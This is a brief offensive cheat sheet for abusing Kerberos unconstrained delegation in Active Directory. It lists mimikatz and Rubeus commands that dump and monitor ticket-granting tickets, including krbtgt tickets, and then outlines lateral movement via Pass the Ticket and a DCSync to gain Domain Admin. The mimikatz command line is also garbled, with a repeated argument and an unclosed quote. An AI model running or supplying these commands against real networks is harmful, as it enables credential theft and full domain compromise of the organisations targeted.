# Unconstrained Delegation

## Requirements: UAC: ADS_UF_TRUSTED_FOR_DELEGATION

## Tools: Rubeus , mimikatz 

# Get tickets

#### 1) mimikatz

 - mimikatz "privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export (Get TGT ticket)

#### 2) Rubeus

 - Rubeus dump /service:krbtgt /nowrap (Get TGT ticket)

 - Rubeus dump /luid:0xdeadbeef /nowrap (Get TGT ticket)

# Force_coercion_with_coerced_auth

#### 1) Rubeus monitor /interval:5 (Get TGT)

### We get the ticket, then we move laterally with Pass the Ticket. If the target is a DC, we do a DC Sync to get Domain Admin access
